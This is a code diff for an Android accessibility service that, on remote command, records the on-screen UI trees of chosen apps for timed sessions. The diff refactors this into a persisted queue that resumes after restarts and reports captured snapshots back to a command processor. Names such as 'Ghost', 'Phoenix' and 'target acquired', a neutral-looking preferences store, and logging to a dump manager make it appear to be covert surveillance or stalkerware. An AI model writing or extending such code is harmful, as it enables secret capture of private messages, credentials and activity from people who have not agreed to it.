@@ -35,13 +35,16 @@ class MyAccessibilityService : AccessibilityService() {
     private val READ_DELAY = 1000L // Only read screen once per second
 
     // TREE SCRAPER STATE
-    private var treeDumpEndTime = 0L
-    private var treeDumpDurationMs = 0L
-    private var targetDumpPkg: String? = null
-    private var pendingTreeCommandId: Int = -1
-    private var pendingTreeDepth: Int = 10
-    private var treeSessionJob: Job? = null
-    private var latestTreeSnapshot: JSONObject? = null
+    private data class TreeTask(
+        val id: Int,
+        val pkg: String?,
+        val durationMs: Long,
+        var endTime: Long = 0L,
+        val depth: Int = 10,
+        var lastSnapshot: JSONObject? = null,
+        var job: Job? = null
+    )
+    private val treeTasks = mutableListOf<TreeTask>()
     
     // PHOENIX STATE
     private var lastPhoenixCheck = 0L
@@ -63,76 +66,90 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
         fun startTreeDump(pkg: String?, mins: Long, cmdId: Int = -1, depth: Int = 10) {
-        val editor = getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
-        treeSessionJob?.cancel()
-        
         if (mins <= 0L) {
-            editor.putLong("tree_dump_end", 0L).putLong("tree_duration_ms", 0L)
-                  .putString("tree_dump_pkg", "").putInt("tree_cmd_id", -1)
-                  .putInt("tree_depth", 10).apply()
-            treeDumpEndTime = 0L
-            treeDumpDurationMs = 0L
-            targetDumpPkg = null
-            pendingTreeCommandId = -1
-            latestTreeSnapshot = null
-            DebugLogger.log("SCRAM", "Scraper Disengaged")
+            treeTasks.clear()
+            saveTreeTasks()
+            DebugLogger.log("SCRAM", "All Scraper Tasks Purged")
             return
         }
 
-        val target = if (pkg.isNullOrEmpty() || pkg == "null") "" else pkg
+        val target = if (pkg.isNullOrEmpty() || pkg == "null") null else pkg
         val durMs = mins * 60 * 1000
         
-        editor.putLong("tree_dump_end", 0L) // 0 means waiting for target
-            .putLong("tree_duration_ms", durMs)
-            .putString("tree_dump_pkg", target)
-            .putInt("tree_cmd_id", cmdId)
-            .putInt("tree_depth", depth)
-            .apply()
-            
-        targetDumpPkg = if (target.isEmpty()) null else target
-        treeDumpDurationMs = durMs
-        treeDumpEndTime = 0L
-        pendingTreeCommandId = cmdId
-        pendingTreeDepth = depth
-        latestTreeSnapshot = null
+        val newTask = TreeTask(id = cmdId, pkg = target, durationMs = durMs, depth = depth)
+        treeTasks.add(newTask)
+        saveTreeTasks()
         
-        DebugLogger.log("SCRAM", "Scraper Armed: [${targetDumpPkg ?: "GLOBAL"}] - Waiting for foreground...")
+        DebugLogger.log("SCRAM", "Task Queued: [${target ?: "GLOBAL"}] (ID: $cmdId). Total Tasks: ${treeTasks.size}")
         
-        if (targetDumpPkg == null) {
-            resumeOrStartWatchdog()
+        if (target == null) {
+            initiateTaskSession(newTask)
         }
     }
 
-    private fun resumeOrStartWatchdog() {
-        if (treeDumpEndTime == 0L) {
-            treeDumpEndTime = System.currentTimeMillis() + treeDumpDurationMs
-            getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
-                .putLong("tree_dump_end", treeDumpEndTime).apply()
-            DebugLogger.log("SCRAM", "Target acquired. Session started. Resolving in ${treeDumpDurationMs / 1000}s.")
-        }
+    private fun initiateTaskSession(task: TreeTask) {
+        if (task.endTime != 0L) return // Already running
         
-        treeSessionJob?.cancel()
-        treeSessionJob = CoroutineScope(Dispatchers.IO).launch {
-            val delayMs = treeDumpEndTime - System.currentTimeMillis()
+        task.endTime = System.currentTimeMillis() + task.durationMs
+        saveTreeTasks()
+        
+        DebugLogger.log("SCRAM", "Session started for ID: ${task.id}. Resolving in ${task.durationMs / 1000}s.")
+        
+        task.job = CoroutineScope(Dispatchers.IO).launch {
+            val delayMs = task.endTime - System.currentTimeMillis()
             if (delayMs > 0) delay(delayMs)
             
-            if (pendingTreeCommandId != -1) {
-                val idToComplete = pendingTreeCommandId
-                val depth = pendingTreeDepth
-                pendingTreeCommandId = -1
-                treeDumpEndTime = 0L
-                getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
-                    .putLong("tree_dump_end", 0L).putInt("tree_cmd_id", -1).apply()
-                    
-                val result = JSONObject().apply {
-                    put("depth_limit", depth)
-                    if (latestTreeSnapshot != null) put("snapshot", latestTreeSnapshot)
-                    else put("error", "NO_DATA_CAPTURED_IN_SESSION")
-                }
-                CommandProcessor.updateCommandStatus(applicationContext, idToComplete, "SCAN_COMPLETE", null, result, null)
-                DebugLogger.log("SCRAM", "Session expired. Command [$idToComplete] resolved.")
+            // Resolve Task
+            val result = JSONObject().apply {
+                put("depth_limit", task.depth)
+                if (task.lastSnapshot != null) put("snapshot", task.lastSnapshot)
+                else put("error", "NO_DATA_CAPTURED_IN_SESSION")
             }
+            
+            CommandProcessor.updateCommandStatus(applicationContext, task.id, "SCAN_COMPLETE", null, result, null)
+            DebugLogger.log("SCRAM", "Session expired. Task [${task.id}] resolved and removed.")
+            
+            treeTasks.remove(task)
+            saveTreeTasks()
         }
+    }
+
+    private fun saveTreeTasks() {
+        val arr = JSONArray()
+        treeTasks.forEach { t ->
+            val o = JSONObject()
+            o.put("id", t.id); o.put("pkg", t.pkg); o.put("dur", t.durationMs)
+            o.put("end", t.endTime); o.put("depth", t.depth)
+            arr.put(o)
+        }
+        getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
+            .putString("tree_tasks_json", arr.toString()).apply()
+    }
+
+    private fun loadTreeTasks() {
+        try {
+            val raw = getSharedPreferences("app_stats", Context.MODE_PRIVATE).getString("tree_tasks_json", "[]")
+            val arr = JSONArray(raw)
+            treeTasks.clear()
+            for (i in 0 until arr.length()) {
+                val o = arr.getJSONObject(i)
+                val task = TreeTask(
+                    id = o.getInt("id"),
+                    pkg = if (o.isNull("pkg")) null else o.getString("pkg"),
+                    durationMs = o.getLong("dur"),
+                    endTime = o.getLong("end"),
+                    depth = o.getInt("depth")
+                )
+                treeTasks.add(task)
+                
+                // Resume watchdog if it was already running
+                if (task.endTime > System.currentTimeMillis()) {
+                    initiateTaskSession(task)
+                } else if (task.endTime > 0) {
+                    // Expired while dead - will be cleaned up on next logic cycle
+                }
+            }
+        } catch (e: Exception) { }
     }
 
     override fun onServiceConnected() {
@@ -143,31 +160,8 @@ class MyAccessibilityService : AccessibilityService() {
 
         val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
         
-        // Restore Scraper Session
-        treeDumpEndTime = prefs.getLong("tree_dump_end", 0L)
-        treeDumpDurationMs = prefs.getLong("tree_duration_ms", 0L)
-        val savedPkg = prefs.getString("tree_dump_pkg", "") ?: ""
-        targetDumpPkg = if (savedPkg.isEmpty()) null else savedPkg
-        pendingTreeCommandId = prefs.getInt("tree_cmd_id", -1)
-        pendingTreeDepth = prefs.getInt("tree_depth", 10)
-        
-        if (pendingTreeCommandId != -1) {
-            if (treeDumpEndTime > System.currentTimeMillis()) {
-                // Session was actively running, resume watchdog
-                resumeOrStartWatchdog()
-            } else if (treeDumpEndTime in 1..System.currentTimeMillis()) {
-                // Session expired while service was dead
-                val idToComplete = pendingTreeCommandId
-                pendingTreeCommandId = -1
-                treeDumpEndTime = 0L
-                prefs.edit().putLong("tree_dump_end", 0L).putInt("tree_cmd_id", -1).apply()
-                val result = JSONObject().apply { put("depth_limit", pendingTreeDepth); put("error", "SERVICE_RESTARTED_SESSION_EXPIRED") }
-                CoroutineScope(Dispatchers.IO).launch {
-                    CommandProcessor.updateCommandStatus(applicationContext, idToComplete, "SCAN_COMPLETE", null, result, null)
-                }
-            }
-            // If treeDumpEndTime == 0, we are just waiting for the app to open. Do nothing yet.
-        }
+        // Restore Scraper Session Queue
+        loadTreeTasks()
         
         val rulesStr = prefs.getString("cached_rules", "{}")
         cachedRules = try {
@@ -200,41 +194,44 @@ class MyAccessibilityService : AccessibilityService() {
             handleGhostEvent(event)
         }
 
-        // --- 1.5 TREE SCRAPER ENGINE (Session-Based) ---
-        if (pendingTreeCommandId != -1) {
-            if (targetDumpPkg == null || targetDumpPkg == pkgName) {
-                
-                // If waiting for the target app, START the timer now
-                if (treeDumpEndTime == 0L) {
-                    resumeOrStartWatchdog()
+        // --- 1.5 TREE SCRAPER ENGINE (Multi-Task Queue) ---
+        val tasksToProcess = treeTasks.filter { it.pkg == null || it.pkg == pkgName }
+        
+        if (tasksToProcess.isNotEmpty()) {
+            val root = rootInActiveWindow
+            tasksToProcess.forEach { task ->
+                // 1. Target Acquisition Logic
+                if (task.endTime == 0L) {
+                    initiateTaskSession(task)
                     CoroutineScope(Dispatchers.IO).launch {
-                        CommandProcessor.updateCommandStatus(applicationContext, pendingTreeCommandId, "TARGET_ACQUIRED_RECORDING", null, null, null)
+                        CommandProcessor.updateCommandStatus(applicationContext, task.id, "TARGET_ACQUIRED_RECORDING", null, null, null)
                     }
                 }
                 
-                val root = rootInActiveWindow
-                if (root != null && treeDumpEndTime > 0 && now < treeDumpEndTime) {
-                    // Standard Session Logging & Memory Update (Throttled)
-                    if (now - lastScreenRead > 2000) {
-                        val treeJson = serializeNode(root, 0, pendingTreeDepth)
-                        latestTreeSnapshot = treeJson // Save the latest frame for the end of the session
-                        
-                        val wrapper = JSONObject()
-                        wrapper.put("pkg", pkgName)
-                        wrapper.put("ts", now)
-                        wrapper.put("tree", treeJson)
-                        DumpManager.appendLog("TREE", wrapper)
-                        lastScreenRead = now
-                    }
+                // 2. Data Capture Logic
+                if (root != null && now < task.endTime && (now - lastScreenRead > 2000)) {
+                    val treeJson = serializeNode(root, 0, task.depth)
+                    task.lastSnapshot = treeJson
+                    
+                    // Shared Stream Logging (Optional but helpful)
+                    val wrapper = JSONObject()
+                    wrapper.put("pkg", pkgName)
+                    wrapper.put("ts", now)
+                    wrapper.put("tree", treeJson)
+                    DumpManager.appendLog("TREE", wrapper)
                 }
             }
-        } else if (treeDumpEndTime != 0L) {
-             // Cleanup expired session if watchdog didn't catch it
-             treeDumpEndTime = 0L
-             targetDumpPkg = null
-             getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
-                 .putLong("tree_dump_end", 0L).apply()
-             DebugLogger.log("SCRAM", "Scraper Session Expired and Cleaned")
+            if (now - lastScreenRead > 2000) lastScreenRead = now
+        }
+
+        // Periodically purge expired tasks that missed the watchdog
+        val expired = treeTasks.filter { it.endTime in 1..now }
+        if (expired.isNotEmpty()) {
+            expired.forEach { 
+                DebugLogger.log("SCRAM", "Task ${it.id} cleaned up manually.")
+                treeTasks.remove(it) 
+            }
+            saveTreeTasks()
         }
 
         // --- 2. STANDARD MONITORING ---
